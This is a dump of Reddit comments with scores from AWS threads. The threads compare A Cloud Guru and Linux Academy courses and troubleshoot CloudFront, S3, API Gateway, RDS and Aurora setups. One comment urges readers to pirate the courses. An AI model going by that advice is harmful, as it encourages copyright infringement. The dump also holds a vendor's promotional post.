So I see the point the OP is trying to make. A person like me is more inclined to the LA way of teaching than ACG.",15.0
g5vbjut,ivwj2w,"I don’t know much about acg but I’ve looked at cantrills material. It’s both extensive and comprehensive. For me, I had taken maareks course for saa and decided to proceed to do the pro cert. there were a lot of gaps in knowledge as maareks course is targeted towards passing the exam. There were a lot of things I didn’t know. So now, I’m going through Cantrills saa course and it’s very detailed and thorough. Once I do that I’ll proceed to pro.
Cantrill is also active in /r/aws certifications and provides lab content for free. The lab material is very good. The only downside is that his pro course is 80$ compared to maareks 17$. But it’s well worth it I reckon. Funny enough....maareks pro course starts with a quiz that is essentially a disclaimer addressing the very criticisms of the course ie no labs, exam is not like the real one etc etc",10.0
g5v7hb8,ivwj2w,"There is no comparison. I did both - ACGs Architect professional course was 14 hours and was very basic, Adrian’s/Linux Academy’s course was 52 hours and contained an unbelievable amount of detail.",6.0
g5vqj8d,ivwj2w,Well then. How can I get Adrian's content now that LA's content has been replaced on ACG?,2.0
g5vqwzh,ivwj2w,It’s on teachable. Or Cantrill.io,3.0
g5w5loq,ivwj2w,"Not the Security course, which seems to have disappeared :(",3.0
g5xyt7g,ivwj2w,He may be working on an update. He seems to be updating the SA Pro at the moment,2.0
g5y396q,ivwj2w,"Yes he is, not till next year though",1.0
g5xwohg,ivwj2w,https://learn.cantrill.io,2.0
g5w5i5p,ivwj2w,"The LA courses tended to be way more detailed, and more about learning than passing the exam. The ACG courses I took were simply not detailed enough to actually pass the exam, but did have good production quality etc. For example, for SAA I did all the ACG material, but was not in any way prepared for the exam. I did the Maarek course on Udemy and learnt far far more.",2.0
g5uy8rg,ivwj2w,"I’ve used ACG for my Solutions Architect Associate in the past. It was good, but not enough. So for my Developer and Sysops associate I added multiple vendors to my study schedule and passed all 3 Associate certs.

I have only used Adrian Cantrill as a supplement due to my Linuxacademy subscription. I was saving his courses for my AWS Pro cert study but ACG took away the courses. Adrian focus more on hands-on labs and covers the material in-depth. 

I will be going with him and Stephene Maarek for my Pro Certs since ACG took away Adrian’s content. Maarek simplifies tough topics and Adrian provides hands on labs and in-depth content. They compliment each other. 

Also Linuxacademy yearly subscription is $449. We want what we paid for. That’s why a lot of people are upset. And it’s shady business practice.",1.0
g6oc8g4,ivwj2w,"ACG’s courses (the ones I followed are CSAA and Pro) skips lots of details. Some lectures are just reading through slides. Very inferior to Cantrill’s course, where almost all lectures are him explaining concepts with hands on demo. I owe my certs to LA’s courses",1.0
g5ur7jd,ivwj2w,I've almost signed up for their service twice but I keep second guessing myself and coming to reddit first to check. Always get steered away thankfully. I have been doing Stephan's courses instead.,2.0
g5vlcnn,ivwj2w,"I totally agree. years ago I used ACG for the first round of my CSA exam and it was really valuable, same with CDA. Recently I did SysOps and the ACG course was great again, of course at that point i'd already been working at AWS for a couple months so that helped. I started studying for SA Pro and started the LA course but had to stop studying for a while for other stuff.  I picked it back up recently and noted it had been deprecated and i'm like uh wtf? I had tried ACG for SA Pro as well and hated it. So I was super disappointed to find they were pushing the ACG course as the new one. So far i'm super disappointed how they have handled the transition.",2.0
g5zvauy,ivwj2w,"I'm really glad to see this post. Now I know I'm not alone in my disappointment. When I saw ACG had acquired LA it was like a punch to the gut. I feared that LA would end up looking like ACG and I was right. I won't be renewing this year either. 

Goodbye cloud gurus.",2.0
g61odw4,ivwj2w,"Sad, I really enjoyed linux academy.",2.0
g62wvs4,ivwj2w,"Yeah so the least they could do is offer a filter so I can avoid the ACG content. Looks like I might have to re-evaluate my company's cloud training as I specifically championed a shift to LA for it's hands on approach with practical application (we did use ACG). 

You can buy $10 practice exams on udemy that give the same content as ACG or just go read Amazon's free documentation. Fml",2.0
g674zol,ivwj2w,"Here's a quick heads up on Cloud Academy (CA) for those that asked / Basically  [Stuart Scott](https://twitter.com/jeffbarr/status/1247905367721271296) (AWS Lead) and myself [Andy Larkin](https://www.linkedin.com/in/larky/) (Head of Content)  have spent the last four years building an AWS Training Library that we felt would really help people learn how to use cloud services to build business applications and solve business problems / Cloud Academy is now 100+ people and we have  800+ courses, 380+ labs, 150+ learning paths delivered in a fully integrated, cross-platform learning experience / we cover 11 of the 12 AWS certs / including the Database Speciality Cert / Stu's AWS team includes ex-AWS curriculum developers [Stephen Cole](https://www.youtube.com/watch?v=ry6dmdStuTo&amp;feature=emb_rel_end) and [Will Meadows ](https://cloudacademy.com/webinars/office-hours-aws-solutions-architect-associate-domain-1-of-4-design-resilient-architectures/)\- our AWS team come straight from the AWS fire,  and as a team we are here to help you master and keep across the skills you need to be successful in your roles / Check out the Database Speciality LP[ here](https://cloudacademy.com/learning-paths/aws-certified-database-specialty-dbs-c01-certification-preparation-for-aws-1-1190/) or the Solution Architect Associate [Lab Challenge](https://cloudacademy.com/library/amazon-web-services/lab-challenges/) to see for yourself / Feel free to ask [us](mailto:stuart.scott@cloudacademy.com) if you want to know more about our AWS content or if you need any advice:-)

At Cloud Academy we focus on helping you pass the exam and master the skills required to be good in your role because that's our customers want / we also cover programming, security and Azure and GCP in depth so you are able to continually increase your cloud skills / Feel free to contact me [andrew.larkin@cloudacademy.com](mailto:andrew.larkin@cloudacademy.com) if you want to know more about [our content](https://cloudacademy.com/library/) or if you have any suggestions for new content / Cheers! Andy",2.0
g679ikx,ivwj2w,This is very disappointing indeed. Another sad aspect is that the links from the new lightweight course are pointing to the old reinvent talks from 2017...at least they could have updated those...seems LA users don’t count much. The LA app is broken on iPad but no fix issued for about at least a week. Very frustrating,2.0
g5xg5eh,ivwj2w,"RIP Linux Academy. Thanks for getting me through SAA, SAP, Azure SA Expert, and GCP Pro Architect... good thing we have Udemy and instructors like Stephane Maarek that have arrived just in time to save the day!",3.0
g5uh27z,ivwj2w,You hate to see it,3.0
g5wtbbl,ivwj2w,Can anyone here make sense of why they’re are even doing this? Is it ego? Do they want people to not succeed?,3.0
g5ubti4,ivwj2w,"Unless they changed something in last year, ACG is great.

I watched their content, did the lab,vand passed my certs.

More recently even hired into AWS as solution architect.  During the tech screening all the answers to every question was in those videos.

No buyers remorse from me",6.0
g5ufhmt,ivwj2w,I guess you have never tried anything else. I don't blame you.,21.0
g5ugfjq,ivwj2w,"Not everyone wants to regurgitate answers to certify themselves as the end goal.  Some of us want to learn the low levels of the products and how to implement them at our jobs.  LA has always had more real world use training, while CG is a fast track to certifying.  It’s why I went with LA over ACG last year.  

In looking at the machine learning course changes myself recently, his complaints are valid.  The previous instructors content is gone and it’s been simplified.  This was the fear of when CG took over LA.  I’m glad you were able to find a job from certifying, but not everyone is trying for certs.  Idk if the Kroonenburgs know this.",15.0
g5ud8cp,ivwj2w,"When ACG started out they had decent content for their associate exams. But it is outdated now and the quality has significantly gone down. Also the course duration and coverage.

For example their AWS Devops Pro course is like 4 hours in length.",10.0
g5vd4kt,ivwj2w,Did you see this post in the DevOps forum? https://i.imgur.com/y2mjuM9.png,5.0
g5xd8vb,ivwj2w,"That doesn't address any of my concerns. I am LA member not ACG. I don't even have access to ACG platform to view those videos, something that we were promised. I want LA content that I paid for and working labs to go with it. ACG secretly deprecated LA content and replaced it with their garbage. 32 hour course replaced with a 4 hour one.

Also that guy Nick is co-owner of ACG and he doesn't know why a course didn't port over? What a bunch of bullshit.",5.0
g5ujexm,ivwj2w,"Haha I had the same experience. In fact, for AWS I preferred ACG to LA. Based on the downvotes I’m guessing this is some kind of religious war so best just keep quiet 🤫",10.0
g5w4y5o,ivwj2w,"I was halfway through the Security Specialisation AWS on LA, now it's been replaced by the inferior and less detailed ACG content. That's why people are pissed off. Feels like a bait and switch",8.0
g5w9duf,ivwj2w,There must be a misunderstanding. A Cloud Guru acquired Linux Academy nine months ago and OP is saying they are sunsetting some of the very good LA courses and replacing them with new substandard ones.,2.0
g5uk31x,ivwj2w,lol seems such,2.0
g5uldde,ivwj2w,"Yea, what the hell is going on here?  Are people brigading the AWS sub?  Why in the world would you want to?",0.0
g5w9hkz,ivwj2w,There must be a misunderstanding. A Cloud Guru acquired Linux Academy nine months ago and OP is saying they are sunsetting some of the very good LA courses and replacing them with new substandard ones.,2.0
g5uq9p5,ivwj2w,"I'll sum it up in a few words ...

""This guy's courses are garbage! You should buy mine instead!""",4.0
g5usfsj,ivwj2w,"I have no dog in this fight, but a more charitable perspective might be that some people have very fond memories of LA and its instructors, and see ACG as a more corporate band of profiteers rather than true lovers of tech and open-source.",12.0
g5umlt3,ivwj2w,"That might actually get me to return to ACG over LA then. 

When I took Azure architecture courses on LA, there was just too much filler material everywhere. I hated it. I replaced it with an O'Reilly subscription.",4.0
g5wq98n,ivwj2w,I have to agree on this one. I often found too little content on LA courses. The one that drew the ultimate straw for me consisted of mostly 3 -5 minute sessions where each session spent a min 1 minute talking about what this session was going to be about. Then came some actual content for  up to a couple of minutes. Then the last minute discussing what we just went through the last 90 seconds and what the next 3-5 minute session was going to be about. No fondness for LA at all. Never tried ACG. I went to Udemy for Maareks content and oreilly also.,2.0
g5x7krp,ivwj2w,That's roughly my experience with LA. Then itpro.tv had tons and tons of filler of people just shooting the breeze on vaguely related topics.,2.0
g5ut9p3,ivwj2w,"I'm glad to hear that you had a good experience. 

I'm a business analyst who just finished my certified cloud practitioners course. 

Did you take the Solutions Architect Associate as well as professional?",1.0
g5ukzya,ivwj2w,"I don't pay for my ACG license, my work does, but I had to check based on the tone of this post.
For the AWS Certified Solutions Architect - Professional 2020, for each of the 8 sections the quiz is 15 minutes . The final practice exam is marked as 3 hours.  DevOps Pro is the same, 15 minute quizes and 3 hour practice exam.

What's the motivation behind this post? It looks like you're just trying to trash ACG.",6.0
g5us22l,ivwj2w,"I am referring to the Linuxacademy platform. Not the ACG. I also gave an example on the original post regarding AWS Devops Pro Cert.

ACG is removing Linuxacademy content and replacing it with their inferior content. If you go to Linuxacademy platform and check, whatever I said is true. I even opened a ticket with them and they admitted it.",9.0
g5uvf09,ivwj2w,"It is on LinuxAcademy - where the content had much more substance - that the videos have been replaced with ACG ones, and 4 hour chapter quizes.",5.0
g7bge5t,ivwj2w,"Thank you to everyone in this thread that has provided their feedback and perspective. As stated earlier, the intention in retiring some of the Linux Academy content was simply to provide our students and customers with the latest and highest quality course material. However, in the weeks since, we have heard you loud and clear that we need to keep these older courses available on the Linux Academy platform.

In response to feedback from the Linux Academy community, as of Oct 1, we are extending access to many legacy courses on the Linux Academy platform through the end of the year, and will keep you informed as updated courses become available. Be sure to check the course descriptions for links to newer content as it is added (or has already been added).

If you log into your Linux Academy account, you can find the courses that were previously retired in the categories you would expect. Please remember if you have any questions or have any difficulty, we are always available at [support@linuxacademy.com](mailto:support@linuxacademy.com) to help you along your learning journey!",2.0
g5yvlhm,ivwj2w,"This is a shame if true, I have been using acloudguru materials since they were first posted to Udemy.  I moved to LinuxAcademy because I was more interested in the devops material they had.

I was kind of worried this was gonna happen with the merger.  

I did log in this morning and did notice the AWS SA Pro 2020 is showing 44 hours instead of 14 hours.  I didnt go into the new course to actually verify that was the case

https://imgur.com/a/ydKsgcw",1.0
g5zndau,ivwj2w,"That’s not the case, I believe the additional 30 hours are made up of quiz’s and tests -   very misleading.",4.0
g5zwc65,ivwj2w,"Whoa if that is the case, that is shitty+++++ and super disappointing.  I used ACG for all my cloud stuff back in the day and this really makes me sad to see :(",2.0
g6newp9,ivwj2w,"Yeah i agree..Fortunately I managed to watch some of LA videos. Not sure if this will for you:
AWS CSA - Associate - https://linuxacademy.com/cp/modules/view/id/245
ASCA CSA - Professional - https://linuxacademy.com/cp/modules/view/id/341",1.0
g7uov88,ivwj2w,Glad you posted this because I was looking at their courses. I’m going to avoid them 100% and look else where.,1.0
g8c0wmv,ivwj2w,Ouch...,1.0
g8kw2k2,ivwj2w,I already signed up I'll probably move to other services next month,1.0
g5xyvz9,ivwj2w,Just pirate it. They forced you to.,1.0
g5ug090,ivwj2w,"Pluralsight has good courses for the pro level certs. I found ACG to be good with the associate level stuff but inadequate for the pro level. LA was better that ACG, but PS was the best.",1.0
g5uexis,ivwj2w,"The Certified Solutions Architect Associate course is very detailed and almost 70 hours long (yes that’s including a few 4-hour practice exams throughout, but it’s still very detailed from what I can tell.",-3.0
g5uxt3a,ivwj2w,"by ""a few"" you mean 12. 

68 hour course is actually 48 hours of ""quizzing""",3.0
g5w7yo3,ivwj2w,"What happened to Adrian Cantrill's AWS Security Specialty Course? 

It was on Linuxacademy and now it's not on ACG. I can't find it on his personal website either.",0.0
g5zmq2o,ivwj2w,Here is the link: [https://linuxacademy.com/cp/modules/view/id/203](https://linuxacademy.com/cp/modules/view/id/203),2.0
g5x1ixy,ivwj2w,I liked the content of the Linux Academy site but there was something about the layout that I just couldn't get over (I also always had poor quality streams). As soon as ACG took over I cancelled my sub and moved to INE (more networking based but still has cloud stuff on it. I can't vouch for how good that is though),0.0
g5ufey6,ivwqa5,You can lock down CloudFront to the CDN IP addresses or use a static high entropy key in a specific header. You would use AWS WAF for both of this rise cases. If your other CDN supports signed URLs that’s another option.,2.0
g5ufjx5,ivwqa5,That's what I need help with!,1.0
g5unot5,ivwqa5,Which option are you looking to do? I mentioned three different ones. It might also help to identify for us who the other CDN is as they all have different capabilities.,1.0
g5uocsf,ivwqa5,"The CDN is FDCServers.

I've tried using rules in Amazon's WAF which failed spectacularly.

I've tried the signed URLs (dead end, no way to generate the key).

And I've tried password protecting the distribution (not supported).

So I'm going to pay $30 to Amazon Support and let them fix it.",1.0
g5urn6x,ivwqa5,Does FDCServers support putting a custom header to pass to CloudFront?,1.0
g5uuzk1,ivwqa5,[Here's a screenshot showing all the options I have.](https://imgur.com/a/52lVEA9),1.0
g5v7f9d,ivwqa5,So doesn’t look like it. Easiest thing to do is ask them for the list of IP Ranges and then build a WAF rule for CloudFront.,1.0
g5vu5w6,ivwqa5,"Tried that. It either blocks EVERYTHING, or just throws ""Invalid rulle"" errors at me.",1.0
g5yp759,ivwqa5,"If you want to post the WAF rules you made I’m happy to review it, it could be something easy to fix.",1.0
g5yv451,ivwqa5,"Sorry, just got this message. 

I've got AWS support on it now. Soon as they get done I'll post their solution.",1.0
g5u4db4,ivwqa5,"if the videos are coming from your S3 bucket and you want to only leverage your CDN to deliver the content, then the S3 Bucket should be set to private (no web hosting and private files).  Then configure the Origin access to your CDN.

[https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/private-content-restricting-access-to-s3.html](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/private-content-restricting-access-to-s3.html)",1.0
g5u4vg1,ivwqa5,"We have that set already. Our workflow looks like this:

S3 -&gt; CloudFront -&gt; CDN -&gt; End Users (Roku).

We have the buckets set so only CloudFront can access them. But ""somebody"" is accessing CloudFront, bypassing our CDN which is set to only serve to our End Users on Roku.

CloudFront is our weak link.",1.0
g5u7xt4,ivwqa5,"Cloudfront is a CDN, are you saying you have another CDN in front of cloudfront?",2.0
g5u8tqm,ivwqa5,"Yes, we do. It's vastly cheaper for us that way. We tried using just CloudFront -&gt; End Users and it was nearly $300/month. CloudFront -&gt; CDN -&gt; End Users is less than $100/month.",1.0
g5ub15o,ivwqa5,Have you tried your own CDN backed directly by S3?,1.0
g5ublxc,ivwqa5,"Yes, we started with that, and it was still expensive. The most cost effective route for us is:

S3 -&gt; CloudFront -&gt; CDN -&gt; End Users.",1.0
g5ubxir,ivwqa5,"I can't work out why that would be the case, but ok, you've tried it, fair enough",1.0
g5uek4r,ivwqa5,"We tried all of the following:
S3 -&gt; End Users: $300/month.
S3 -&gt; CDN -&gt; End Users: $350/month
S3 -&gt; CloudFront -&gt; End Users: $250/month
S3 -&gt; CloudFront -&gt; CDN: $100/month

The issue is bandwidth cost. Straight from S3 to anywhere but CloudFront is expensive. But at the same time, CloudFront to End Users is even more expensive. But S3 to CloudFront alone is free, and CloudFront to a single point CDN is very affordable.

If we had less than 10,000 or more than 50,000 End Users, it'd be cheaper to just use S3 -&gt; CloudFront -&gt; End Users under Amazon's pricing scheme.",3.0
g5u5vav,ivwqa5,"is cloudfront set to private? This is configured using signed URLs and signed cookies.

[https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/PrivateContent.html](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/PrivateContent.html)",1.0
g5u8kaz,ivwqa5,That may work. I just need to check with our CDN to make sure they support it.,1.0
g5u9lv7,ivwqa5,You could potentially use Lambda at Edge to help configure this.,1.0
g5uaz95,ivwqa5,"Does that simplify setting this up? Or does it just add more expense?

Our CDN DOES support signed URLs, by the way, I just don't know how to set it up.",1.0
g5uebkv,ivwqa5,"There is always an expense when using additional services. But it could help by providing a way to validate the user and passing along a signed URL to the end-user / device.

Examples of Lambda at Edge are here: [https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/lambda-examples.html#lambda-examples-redirecting-examples](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/lambda-examples.html#lambda-examples-redirecting-examples)

One of these may give you an idea of what is possible. 

With a private Cloudfront distribution, you need to create a cloudfront key. This becomes your trusted signer for your account. You then need to create an application that creates the URL / signed cookie. If your CDN provider does that, you should be good. I would work with them on how to set that up. They would need your key to sign the URL / cookie.",1.0
g5uf9nf,ivwqa5,"And now I'm lost again.

The CDN has an option for ""URL Signing"" which adds a setting for ""URL Signing Key."" But that's all they have. I've asked them for help setting it up, but they just say ""turn on that option and enter your key."" I don't even know how to get the key, or how to set it up on the CloudFront end at this point.",1.0
g5ug4ao,ivwqa5,This blog post may help you. [https://medium.com/roam-and-wander/using-cloudfront-signed-urls-to-serve-private-s3-content-e7c63ee271db#eb87](https://medium.com/roam-and-wander/using-cloudfront-signed-urls-to-serve-private-s3-content-e7c63ee271db#eb87),1.0
g5uhayd,ivwqa5,"That's good, up until step 4. ""Generate Signed CloudFront URLs"" 

How? I've downloaded the key pair files, but now what do I do with them? That's the problem. Everything says ""you CAN do this,"" but doesn't show how step by step!",1.0
_,ivwqa5,,
g5u3tin,ivwoyy,You can have the api data pushed to an s3 bucket and have a lambda request trigger on that bucket,3.0
g5vdcus,ivwoyy,Are we polling for the data or how is it being pushed to s3?,2.0
g60wgm4,ivwoyy,"Lambda can poll an API

Did a quick google of lambda and api tutorials 
Should be able to work backwards from https://dev.to/andrewevans0102/sending-a-weather-forecast-with-an-aws-lambda-and-twilio-23np. To fit your needs",1.0
g5u2x1f,ivv21y,"S3 itself would not do this.  Either you're compressing the logs before sending them, or you have a separate process (on another box, as a Lambda, etc) that is doing it.",8.0
g5u322g,ivv21y,How are you pushing your files? That doesn't just happen by itself.,2.0
g5z0xpn,ivv21y,can you post the exact code used to push the logs to s3?,2.0
g63pu1r,ivv21y,Thank you all for the feedback. Looks like the application I am running is compressing the data when pushing it out to S3. Not sure why I didn't think of checking that first.,1.0
g5u1jkd,ivv21y,"I’m really new to this but I think there’s online services that can convert it to JSON before you upload. Alternatively, and again I’m new, but I think you may need a storage gateway.",-2.0
g5uo7yj,ivv21y,"Why do you think a user would need Storage Gateway to push uncompressed files to S3? I'm curious what thought process led to this conclusion.

Also, as the OP stated, the logs are in JSON, but when they view the bucket, the files have been gzipped.

S3 isn't going to automagically compress files, something else is doing it. Storage Gateway is not the answer to unknown behaviors.",0.0
g5wkrde,ivv21y,My thought was accessing by a remote host ... that potentially is not on the cloud ... how could you expect S3 to format automatically into JSON for the cloud. It’s not very clear where the access is... like how do you have log files on the cloud that are not compatible with the cloud? It wouldn’t make sense. OP is off the cloud with the remote host.... and expecting a gateway service.,0.0
g5wpc2t,ivv21y,"What?

S3 is usable anywhere.

You can store whatever data you want in it, in whatever format you desire. 

There's no such thing as a file that is ""not compatible with the cloud"".

You can push files to S3 from anywhere on the Internet with the correct credentials.

How did you reach the conclusion they are ""off the cloud with the remote host""?",3.0
g5wq58j,ivv21y,How did you reach the conclusion they were on the cloud?.... if remote host is for a server then gateway is necessary,1.0
g5txgdn,ivvm71,"We have something similar. API Gw supports authorizers whose job is to decide whether to allow a certain request to go through to the lambda. 

Well, in this authorizer, you can look for the referer or origin Header fields. It isn’t foolproof in that someone can spoof those headers but it’ll protect you from the low effort hackers.",5.0
g5vrqyd,ivvm71,"Referer header can be easily spoofed. Do NOT rely on referer or Origin or CORS for authentication. A simple curl can bypass it, postman can bypass it, it’s not intended for authentication.",2.0
g5xvdjz,ivvm71,"I think google maps too relies on origin or referrer (i forget which one) to tie an API key to a domain. If it is good enough for Google maps, I'm not so worried about it.

While you aren't wrong in repeating what I already said in my original comment that Origin/Referrer can be spoofed, it would be good to read this SO discussion, especially the comment with 42 upvotes which I'll quote below: [https://stackoverflow.com/questions/21058183/whats-to-stop-malicious-code-from-spoofing-the-origin-header-to-exploit-cors](https://stackoverflow.com/questions/21058183/whats-to-stop-malicious-code-from-spoofing-the-origin-header-to-exploit-cors)

&amp;#x200B;

&gt;*If someone wants to spoof something, then  they can do so. Using pretty much any scripting language they can  construct http requests. Perl and Python have http libraries which make  this pretty easy. The libraries store and send cookies, let you add  arbitrary headers, and give plenty of debugging information. So the CORS  headers are just to make it harder for malicious javascript on a forum  you read to do something nasty to your bank account on another domain  when you're logged into both in your browser.*",1.0
g5vkf3b,ivvm71,Specific website with a static IP? Api gateway has a resource policy that can deny requests that don’t come from an IP or VPC.,3.0
g5u46w9,ivvm71,referer can be empty. So checking referer header leads you wrong validation. Can I ask you what the actual reason behind this requirement is?,2.0
g5u4txj,ivvm71,"So we have an internal order management system, but the status of the order is in Salesforce.


We want to make sure that the people accessing the API are coming from the internal order management system.",1.0
g5unotb,ivvm71,"Salesforce must have auth token based access to their API. It means only your internal OMS knows client secret of the API and access salesforce with token. As long as you keep your secret safe within your internal system, nobody can access salesforce via api without authorization.

I assume only logged-in users can access internal OMS. At BE, you only accept requests from authorized users.",1.0
g5vrm5y,ivvm71,"You can’t really rely on anything like the referer or origin header or CORS as those can be spoofed easily. The only way to secure is via either a signed token (JWT) or some similar oauth flow, or via hosting on a shared domain that can read each other’s cookies. signed URLs might also make sense. 

It’s just technically impossible as those “link coming from a specific website” headers can be spoofed to contain whatever you want with a simple curl or modified browser.",2.0
g5ubb2f,ivvm71,"If you want to ""make sure"" people are coming from an specific source you need to have some sort of notification. If you only want to validate the requests to avoid robots and bots you can use WAF to validate some headers or restrict to geolocation or ip range if that suits you",1.0
g5ucwzi,ivvm71,What do you mean by notification? How can I leverage this notification?,1.0
g5v7eu7,ivvm71,"Sorry, I meant ""authentication"", my phone changed the word and I didn't notice",2.0
g5tt7wl,ivut7f,[https://aws.amazon.com/premiumsupport/knowledge-center/ec2-port-25-throttle/](https://aws.amazon.com/premiumsupport/knowledge-center/ec2-port-25-throttle/),2.0
g5tttb1,ivut7f,That’s on sending.  I know I need to go through ses to send.  How do I receive a mail? Isn’t that what I have to do to set up ses.,1.0
g5ttyhk,ivut7f,"..the only comment needed here!


OP, you'll need to use SES, or another provider for mail delivery. But if your volume is small, you can use your Gmail account",1.0
g5ttkul,ivut7f,aws bans port 25 by default. either use 587/465 or ask aws to remove the ban,1.0
g5tu8ec,ivut7f,Does it ban it for incoming as well as outgoing?  Actually I just need outgoing. I thought I would need incoming to be able to verify the mail address with ses.,1.0
g5uhazx,ivut7f,yes outgoing too. i also assumed that it would only be incoming and the documentation should be a lot better,1.0
g5txjqp,ivud9k," Aurora is best at really high transaction rates if you have tons of queries happening at the same time i.e. 100's then I would expect you would see better performance on Aurora 5.7. If you are lower but more complex transactions regular RDS will usually be a ""faster"" option.    Aurora really shines when you need huge amounts of throughput and can take advantage of the reader nodes that have near zero replication lag (simplified it is using backend storage replication instead of transition log type replication so your talking milliseconds instead of seconds)",4.0
g608he5,ivud9k,"Definitely not 100s at the same time. 

The replication lag is the bit I'm not sure if RDS should be preferred. Aurora also promises automatic fail over with almost zero data loss because of no replication lag.",1.0
g60knrh,ivud9k,"So multi-az rds has very very low data loss chances also.  Given the data you have shared so far I would probably lean towards multi-az standard RDS. If your load increase in the future to 100sec request I bet MySQL 8 will be available in Aurora... 

This type of fail over is where Aurora and regular rds really differ. With multi az regular rds the backup instance is hidden and not available to you in anyway other than for failover but your still paying essentially double. With Aurora you have a cluster with a writer and any number of readers and in a failover event one of the readers are promoted to the writer so if you are able to use a reader it’s a little cheaper as you can use that failover box. Any use of the reader endpoints has to be built into the application layer there is no magic proxy that lets you utilize readers.",1.0
g7py9zq,ivud9k,"Since Multi-AZ RDS has physical synchronous replicated storage, I'd say there's \*no\* data loss between primary and replica EBS.  Either a block gets committed to both primary and standby or it doesn't get committed to either.  (In other words, the database doesn't return a 'committed' back to the client unless both the primary and replica EBS blocks have been updated.)

You can compare this to asynchronous replication which is typical when you had an east coast and west coast data center that were separated by hundreds of milliseconds.  You wouldn't wait for blocks to be replicated cross-country, that would cause too much DB slowdown.  But if your DB fails, you have potentially 100s of ms of data missing in the backup DB.

With Aurora there's only 1 storage volume that all server connect to, inherently they must be the same.  The ""replication"" in Aurora is updating buffer cache on read-only nodes.  When blocks are modified, they go to reader nodes and say ""do you have this block in your buffer pool?""  If yes, replace it with this updated version of the block.  If no, throw it out, doesn't matter.",1.0
g5zpq7g,ivud9k,If you're going to sit an analytics tool or something with heavy read need then go Aurora. Otherwise I would do MySQL 8.,1.0
g7pyd85,ivud9k,I'm not-so-secretly hoping that AWS announces Aurora MySQL 8.0 at re:Invent in a few months :),1.0
g5tpt8b,ivud9k,"~~My quick google show they have MySQL 8 for Aurora~~ [~~https://aws.amazon.com/about-aws/whats-new/2018/10/amazon-rds-now-supports-mysql-8/~~](https://aws.amazon.com/about-aws/whats-new/2018/10/amazon-rds-now-supports-mysql-8/)  ~~so why not get best of both~~

I was on mobile and my google fu was bad",0.0
g5tq4bb,ivud9k,That’s RDS - Aurora (AWS’ own MySQL compatible DB) only supports 5.7.,3.0
g5u2bfz,ivths0,"If you have a datacenter or colo and you want aws services next to your on prem equipment for latency or compliance reasons, you want outposts. If you are developing an application that is delivered over 5g and you need minimal latency between end user devices and your service, you want wavelength.",5.0
g5vengz,ivths0,I think I am getting it but let me read through Jeff blogs again. It's mainly from the CSP / SP perspective.,1.0
g5u234g,ivths0,"Hi, I've written detailed blog posts about both of these AWS offerings. 

1, 2 - We have not shared any details about the physical configuration of Wavelength. I really don't know if we deploy Outpost racks in 5G locations to create Wavelength Zones, but it should  not matter.

3 - You should be able to find details in my blog posts.

4 - I don't have numbers to share.  You can use either one as the basis for a highly available application.

Feel free to DM or email me (jbarr@amazon.com)  and I can connect you with the product teams.",4.0
g5vecxh,ivths0,"Thanks Jeff. Your blogs are of great help as always. Let me check again and my main questions are on 1,2 &amp; 4 from Service Provider / Large ent perspective.",1.0
g5thfot,ivt9p6,What you are talking about is not a backup but rather an export to a different format for consumption by other aws services. https://aws.amazon.com/about-aws/whats-new/2020/01/announcing-amazon-relational-database-service-snapshot-export-to-s3/,12.0
g5thchi,ivt9p6,"I think the back up to s3 allows you to make sql queries on your s3 bucket using s3 select

I’ve always just done a sql dump when I want to backup outside of rds",4.0
g5tjvxi,ivt9p6,"Worst case Athena could query to csv or other format then import.  As others said you exported for Athena or Redshift Spectrum to use the data from parquet - this wasn't meant to be used as a backup. 

Good news is it sounds like you have your data available.",4.0
g5ti2jj,ivt9p6,"You can export snapshots to S3 as Parquet: https://aws.amazon.com/about-aws/whats-new/2020/01/announcing-amazon-relational-database-service-snapshot-export-to-s3/ and https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_ExportSnapshot.html. Really good for analytics workloads. 

You can restore a _backup_ from S3 to RDS, one way is: https://docs.aws.amazon.com/AmazonRDS/latest/APIReference/API_RestoreDBInstanceFromS3.html

You can leverage some AWS services to query the Parquet files.  Athena (https://aws.amazon.com/blogs/big-data/analyzing-data-in-s3-using-amazon-athena/) and Redshift (either by copy https://aws.amazon.com/about-aws/whats-new/2018/06/amazon-redshift-can-now-copy-from-parquet-and-orc-file-formats/ or via Spectrum (https://aws.amazon.com/blogs/big-data/10-best-practices-for-amazon-redshift-spectrum/).",3.0
g5tk0s9,ivt9p6,"I believe your restore backup link is referring to mysql backup not parquet perhaps, I'm not sure.",3.0
g5u2yo6,ivt9p6,"From what the other comments say I think that’s the point. When exporting to parquet you are not making a backup, you are making an export to be used in other ways.",3.0
g5u4dso,ivt9p6,Yes. It’s a MySQL backup. You cannot export a MySQL backup to parquet. Only a snapshot.,3.0
g5ttfgi,ivru4i,"workspaces are not good for anything that requires audio due to the latency

you might try the beta wsp protocol as it might improve things a bit. otherwise you might need to do QoS to prioritize UDP traffic",1.0
g5t41fo,ivruji,"It’s private in the sense that other tenants / AWS customers wouldn’t be able to eavesdrop or capture communication flows. However, it is NOT encrypted. If you need to achieve compliance, your best bet is to use encryption protocols at your stack - TLS / SSH everywhere.

As an alternative the “n” instance families can do hardware based encryption between instances in the same region and across VPC peering. It may not be what you need for compliance, but it’s worth a shot: https://www.wwt.com/article/security-benefits-of-aws-nitro-based-architecture",10.0
g5tsc4y,ivruji,"I think there was a vague mention at Re:invent, that traffic between instances is encrypted using dedicated Asics. Additionally inter region VPC peering is also encrypted irrespective of the instance type.

That being said, tenants should also t
ake care of encrypting their own stuff.",3.0
g5t4zfh,ivruji,"Thanks so much, perfect answer",1.0
g5tfxc9,ivruji,"Exactly, there may be network encryption but developers should never expect nor rely on network encryption.  Just because there is a net it doesn’t mean you do high steel work without tying off if you want safety.",1.0
g5tttuy,ivruji,I thought that nitro &amp; encryption was available for any KVM instances at this point? Or am I wrong? Or do they mean that you unlock the super fast 100gbps on N type?,0.0
g5tymsb,ivruji,"""AWS provides secure and private connectivity between EC2 instances of all types. In addition, some instance types use the offload capabilities of the underlying hardware to automatically encrypt in-transit traffic between instances, using AEAD algorithms with 256-bit encryption. There is no impact on network performance. The following requirements must be met to ensure the additional in-transit traffic encryption:

* The instances use the following instance types: C5a, C5ad, C5n, G4, I3en, M5dn, M5n, P3dn, R5dn, and R5n.
